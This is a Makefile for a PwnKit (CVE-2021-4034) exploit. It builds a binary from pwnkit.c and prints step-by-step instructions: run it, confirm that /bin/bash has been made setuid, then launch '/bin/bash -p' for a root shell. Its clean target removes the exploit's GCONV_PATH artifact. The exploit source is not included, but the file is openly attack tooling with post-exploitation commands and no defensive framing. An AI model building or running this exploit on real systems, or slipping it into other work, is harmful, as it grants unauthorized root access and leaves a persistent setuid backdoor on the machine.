# Makefile — CVE-2021-4034 PwnKit
# The payload is compiled at runtime by cve-2021-4034 itself.

CC     = gcc
CFLAGS = -Wall

.PHONY: all clean

all: cve-2021-4034
	@echo "[*] Build complete. Run: ./cve-2021-4034"
	@echo "[*] Then: ls -la /bin/bash  (should be -rwsr-xr-x)"
	@echo "[*] Then: /bin/bash -p"

cve-2021-4034: pwnkit.c
	$(CC) $(CFLAGS) -o $@ $<

.PHONY: clean
clean:
	rm -f cve-2021-4034
	rm -rf pwnkit "GCONV_PATH=."
